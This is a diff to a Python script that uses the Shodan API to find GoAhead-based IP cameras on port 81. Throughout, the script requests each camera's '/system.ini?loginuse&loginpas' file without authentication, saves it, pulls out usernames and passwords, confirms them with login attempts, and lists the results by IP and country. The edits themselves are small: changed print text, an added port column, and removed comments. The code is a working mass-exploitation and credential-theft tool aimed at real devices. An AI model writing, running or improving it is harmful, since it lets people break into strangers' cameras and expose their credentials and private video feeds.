@@ -52,7 +52,7 @@ def custom(ip):
   for ip in list(set(ips)):
    try:
 
-    print(f"\nTrying {Fore.CYAN + ip}")
+    print(f"\nTested {Fore.CYAN + ip}")
     r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
 
     with open(f'camera_{ip}.ini', 'wb') as f:
@@ -168,8 +168,6 @@ else:
     try:
         key = shodan.Shodan(args.api)
         key.search('realm="GoAhead", domain=":81"')
-        #with open('api_key.config', 'w') as e:
-        # e.write(args.api)
         try:
          conf = configparser.RawConfigParser()
          conf.read("api_key.config", encoding='utf-8')
@@ -186,9 +184,6 @@ else:
     except Exception as _:
         print("Wrong API key! Try again.")
         exit()
-
-# input("End")
-# exit()
 
 os.system('clear || cls')
 
@@ -221,7 +216,7 @@ if os.path.exists('api_key.config') == False:
       conf.read("api_key.config", encoding='utf-8')
       conf.set("API", "API", api)
       conf.write(open("api_key.config", "w", encoding='utf-8'))
-      os.system('cls || clear')
+      #os.system('cls || clear')
       break
     except KeyboardInterrupt:
       print("\nProgram stopped.")
@@ -232,22 +227,7 @@ else:
   conf = configparser.RawConfigParser()    
   conf.read("api_key.config", encoding='utf-8')
 
-  # while True:
-  #   api = input('Enter valid API key: ')
-  #   try:
-  #    if api == '':
-  #     pass
-  #    else:
-  #     key = shodan.Shodan(api)
-  #     key.search('realm="GoAhead", domain=":81"')
-  #     with open('api_key.config', 'w') as e:
-  #      e.write(api)
-  #     os.system('cls || clear')
-  #     break
-  #   except:
-  #     print("Wrong API key! Try again.\n")
-
-key = conf.get("API", "api") #open('api_key.config', 'r').read()
+key = conf.get("API", "api")
 
 api = shodan.Shodan(key)
 
@@ -272,7 +252,7 @@ def st():
  for ip in list(set(ips)):
   try:
 
-   print(f"Trying {Fore.CYAN + ip}")
+   print(f"Tested {Fore.CYAN + ip}")
    r = get(f"http://{ip}:81/system.ini?loginuse&loginpas", timeout=10)
 
    with open(f'camera_{ip}.ini', 'wb') as f:
@@ -298,7 +278,7 @@ if len(num_of_vulnerable) >= int('1'):
 else:
   taro2 = Fore.LIGHTRED_EX + str(len(num_of_vulnerable))
 
-th = ['IP', 'USERNAME', 'PASSWORD', 'COUNTRY']
+th = ['IP', 'PORT', 'USERNAME', 'PASSWORD', 'COUNTRY']
 td = []
 
 if len(num_of_vulnerable) >= int('1'):
@@ -327,6 +307,7 @@ if len(num_of_vulnerable) >= int('1'):
        page = s.get(url=f'http://{ipi}:81', auth=(words[i], words[i+1]), timeout=10)
        if page.status_code == 200:
         td.append(ipi)
+        td.append('81')
         td.append(words[i])
         td.append(words[i+1])
         ad = ip(ipi)
@@ -345,6 +326,7 @@ if len(num_of_vulnerable) >= int('1'):
        request = get(f'http://{ipi}:81', timeout = 10, verify = False, auth = HTTPDigestAuth(words[i], ''))
        if request.status_code == 200:
         td.append(ipi)
+        td.append('81')
         td.append(words[i])
         td.append('')
         ad = ip(ipi)
